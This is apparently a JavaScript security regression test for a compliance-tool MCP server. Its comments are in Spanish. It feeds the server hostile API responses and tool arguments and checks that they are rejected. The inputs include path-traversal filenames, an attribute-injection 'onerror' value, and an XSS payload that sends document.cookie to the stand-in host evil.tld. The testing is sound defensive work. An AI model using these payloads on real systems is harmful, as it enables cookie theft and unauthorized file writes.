/*
 * Pruebas de seguridad contra el BUILD (`dist/index.js`), hablándole por stdio
 * como lo haría un agente real, con una API falsa bajo nuestro control.
 *
 * Las dos cosas que se protegen aquí las descubrió una auditoría ejecutando
 * código, no leyéndolo, y ninguna la habría visto un test que mirara el fuente:
 *
 *  1. Los nombres de fichero que escribimos en el proyecto del usuario salen de
 *     la RESPUESTA de la API. Con `docType: "../../PWNED"` se escribía fuera del
 *     directorio declarado — en cualquier sitio del disco.
 *  2. El `appId` (que devuelve la propia API vía get_claim_status) y el `lang`
 *     se interpolaban en crudo en atributos HTML del snippet que se ESCRIBE en
 *     la web del cliente. Un `"` cerraba el atributo: XSS almacenado, escrito
 *     por la herramienta de cumplimiento.
 *
 * El vector común es una API hostil: LEXVIBE_API_URL apuntado a otro host, la
 * API comprometida, o un MITM sobre http en self-hosting. Requiere `npm run
 * build` antes (lo hace el CI).
 */
import assert from "node:assert/strict";
import { createServer } from "node:http";
import { mkdtempSync, mkdirSync, readFileSync, writeFileSync, existsSync } from "node:fs";
import { tmpdir } from "node:os";
import { dirname, join, sep } from "node:path";
import { test } from "node:test";
import { fileURLToPath } from "node:url";
import { Client } from "@modelcontextprotocol/sdk/client/index.js";
import { StdioClientTransport } from "@modelcontextprotocol/sdk/client/stdio.js";

const ROOT = join(dirname(fileURLToPath(import.meta.url)), "..");
const ENTRY = join(ROOT, "dist", "index.js");

/** API falsa que responde lo que le digamos a cada ruta. */
async function hostileApi(routes) {
  const server = createServer((req, res) => {
    const body = routes[new URL(req.url, "http://x").pathname];
    res.writeHead(body ? 200 : 404, { "Content-Type": "application/json" });
    res.end(JSON.stringify(body ?? { error: "not found" }));
  });
  await new Promise((r) => server.listen(0, "127.0.0.1", r));
  return { url: `http://127.0.0.1:${server.address().port}`, close: () => server.close() };
}

/**
 * Ejecuta `body` con un cliente MCP conectado al servidor real y cierra
 * siempre, también si una aserción falla: sin esto, un fallo deja vivo el
 * proceso hijo y el runner de node se queda colgado en vez de reportar.
 */
async function withClient(apiUrl, body) {
  const client = await connect(apiUrl);
  try {
    return await body(client);
  } finally {
    await client.close();
  }
}

/** Cliente MCP contra el servidor real, apuntado a la API falsa. */
async function connect(apiUrl) {
  const client = new Client({ name: "security-test", version: "1" }, { capabilities: {} });
  await client.connect(
    new StdioClientTransport({
      command: process.execPath,
      args: [ENTRY],
      env: { ...process.env, LEXVIBE_API_URL: apiUrl, LEXVIBE_ANALYTICS: "off" },
    }),
  );
  return client;
}

function workspace() {
  return mkdtempSync(join(tmpdir(), "lexvibe-sec-"));
}

test("una API hostil no escribe fuera del directorio /legal", async () => {
  const api = await hostileApi({
    "/api/generate": {
      documents: [
        // Sale del árbol: dos niveles arriba del `dir` declarado.
        { docType: "../../PWNED", locale: "sh", content: "owned", source: "ai" },
        // Separador de Windows y ruta absoluta, por si el join se comporta distinto.
        { docType: "..\\..\\PWNED2", locale: "sh", content: "owned", source: "ai" },
        { docType: "/etc/PWNED3", locale: "sh", content: "owned", source: "ai" },
        // Este es legítimo y SÍ debe escribirse: el filtro no puede pasarse de celoso.
        { docType: "privacy", locale: "en", content: "# Privacy", source: "ai" },
      ],
    },
  });
  const root = workspace();
  const dir = join(root, "victim");
  mkdirSync(dir, { recursive: true });

  try {
    await withClient(api.url, async (client) => {
      const res = await client.callTool({
        name: "make_compliant",
        arguments: { dir, answers: { appName: "T", contactEmail: "a@b.c" }, markets: ["eu"] },
      });
      const written = JSON.parse(res.content[0].text).filesWritten ?? [];

      for (const p of written) {
        assert.ok(p.startsWith(join(dir, "legal") + sep), `escribió fuera de /legal: ${p}`);
      }
      assert.ok(!existsSync(join(root, "PWNED.sh.md")), "el traversal llegó al disco");
      assert.ok(!existsSync(join(root, "PWNED2.sh.md")), "el traversal con \\ llegó al disco");
      assert.ok(
        written.some((p) => p.endsWith("privacy.en.md")),
        "el documento legítimo debería haberse escrito",
      );
    });
  } finally {
    api.close();
  }
});

test("un appId con marcado no puede inyectar HTML en el fichero del usuario", async () => {
  const api = await hostileApi({});
  const dir = workspace();
  const file = join(dir, "index.html");
  writeFileSync(file, "<html><head><title>t</title></head><body></body></html>");

  try {
    await withClient(api.url, async (client) => {
      const res = await client.callTool({
        name: "install_snippet",
        arguments: {
          file,
          appId: 'abc"><script>fetch("//evil.tld/?c="+document.cookie)</script><script src="x',
        },
      });

      // El esquema lo rechaza antes de tocar el fichero: el error es la respuesta correcta.
      assert.equal(res.isError, true, "un appId con marcado debería rechazarse");
      const html = readFileSync(file, "utf8");
      assert.ok(!html.includes("evil.tld"), "se escribió el payload en el fichero del usuario");
      assert.ok(!html.includes("<script>fetch"), "se inyectó un <script> ejecutable");
    });
  } finally {
    api.close();
  }
});

test("un lang inventado no se emite como atributo", async () => {
  const api = await hostileApi({});
  const dir = workspace();
  const file = join(dir, "index.html");
  writeFileSync(file, "<html><head><title>t</title></head><body></body></html>");

  try {
    await withClient(api.url, async (client) => {
      await client.callTool({
        name: "install_snippet",
        arguments: { file, appId: "real-app-id", lang: 'en" onerror="alert(1)' },
      });

      const html = readFileSync(file, "utf8");
      assert.ok(!html.includes("onerror"), "el lang inyectó un manejador de eventos");
      assert.ok(!html.includes('data-lang="en"'), "un lang inválido no debería emitirse");
      assert.ok(html.includes('data-lexvibe-app="real-app-id"'), "el snippet válido no se instaló");
    });
  } finally {
    api.close();
  }
});

test("un appId inválido no se reporta como instalado sin avisar", async () => {
  // Si el emisor cae al placeholder por su cuenta pero el handler conserva el
  // id original, el aviso de "estás con YOUR_APP_ID" no se emite: al agente se
  // le dice que quedó instalado y enlazado cuando el banner apunta a un
  // placeholder. O se rechaza, o se avisa — lo que no vale es callar.
  const api = await hostileApi({});
  const dir = workspace();
  const file = join(dir, "index.html");
  writeFileSync(file, "<html><head><title>t</title></head><body></body></html>");

  try {
    await withClient(api.url, async (client) => {
      const res = await client.callTool({
        name: "install_snippet",
        arguments: { file, appId: "no válido con espacios" },
      });
      const body = res.content[0].text;
      assert.ok(
        res.isError === true || body.includes("YOUR_APP_ID"),
        "un appId inválido debe rechazarse o avisar del placeholder",
      );
      const html = readFileSync(file, "utf8");
      assert.ok(
        !html.includes("no válido"),
        "el id inválido no debería llegar al fichero del usuario",
      );
    });
  } finally {
    api.close();
  }
});

test("los 12 idiomas del producto sí se emiten", async () => {
  // La primera versión de la whitelist se escribió de memoria y llevaba
  // pl/sv/da/fi/no en vez de ja/zh/ko/hi/ar: habría tirado en silencio el
  // `data-lang` de cinco idiomas que el producto sí vende.
  const api = await hostileApi({});
  const dir = workspace();

  try {
    await withClient(api.url, async (client) => {
      for (const lang of ["es", "en", "fr", "de", "it", "pt", "nl", "ja", "zh", "ko", "hi", "ar"]) {
        const file = join(dir, `${lang}.html`);
        writeFileSync(file, "<html><head><title>t</title></head><body></body></html>");
        await client.callTool({
          name: "install_snippet",
          arguments: { file, appId: "real-app-id", lang },
        });
        assert.ok(
          readFileSync(file, "utf8").includes(`data-lang="${lang}"`),
          `${lang} es del catálogo y debería emitirse`,
        );
      }
    });
  } finally {
    api.close();
  }
});
